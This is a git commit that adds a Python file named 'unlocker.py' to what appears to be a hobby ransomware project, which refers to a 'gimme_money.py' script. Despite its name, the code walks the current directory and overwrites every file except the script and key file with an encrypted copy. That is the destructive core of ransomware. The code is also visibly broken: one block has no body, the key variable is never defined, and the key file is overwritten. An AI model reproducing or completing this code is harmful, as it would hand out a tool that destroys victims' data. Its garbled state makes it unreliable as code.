2742b761e93cb7f40970868c44267551d1b617fd
tanmay8146 <rv3nom@outlook.com>
2023-01-17 23:56:35 +0530

    ...

---
+++ unlocker.py
@@ -0,0 +1,28 @@
+print("Under Construction...")
+import os
+from cryptography.fernet import Fernet
+
+files= []
+
+for file in os.listdir():
+    if file == 'gimme_money.py' or file == 'key.txd':
+        continue
+    if os.path.isfile(file):
+        files.append(file)
+
+# print(files)
+
+with open("key.txd", "rb") as key:
+    
+# print(KEY)
+
+with open("key.txd", "wb") as thekey:
+    thekey.write(KEY)
+
+for file in files:
+    with open(file, "rb") as thefile:
+        contents = thefile.read()
+    content_encr = Fernet(KEY).encrypt(contents)
+    with open(file, "wb") as thefile:
+        thefile.write(content_encr)
+        
